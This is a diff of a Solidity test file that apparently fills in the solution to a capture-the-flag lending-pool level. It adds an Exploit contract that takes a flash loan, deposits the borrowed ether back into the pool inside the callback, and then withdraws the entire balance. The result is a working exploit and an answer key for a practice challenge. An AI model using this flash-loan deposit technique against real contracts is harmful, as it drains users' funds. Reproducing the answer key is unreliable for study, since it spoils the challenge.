@@ -14,7 +14,13 @@ contract LendingPoolTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        uint256 deposit = address(instance).balance;
+        Exploit exploit = new Exploit(instance, deposit);
+
+        vm.prank(address(exploit));
+        instance.flashLoan(deposit);
+        vm.prank(address(exploit));
+        instance.withdraw();
 
         checkSuccess();
     }
@@ -22,4 +28,20 @@ contract LendingPoolTest is BaseTest {
     function checkSuccess() internal view override {
         assertTrue(address(instance).balance == 0, "Solution is not solving the level");
     }
+}
+
+contract Exploit is IFlashLoanReceiver {
+    LendingPool public pool;
+    uint256 deposit;
+
+    constructor(LendingPool _pool, uint256 _deposit) {
+        pool = _pool;
+        deposit = _deposit;
+    }
+
+    function execute() external payable override {
+        pool.deposit{value: deposit}();
+    }
+
+    receive() external payable {}
 }
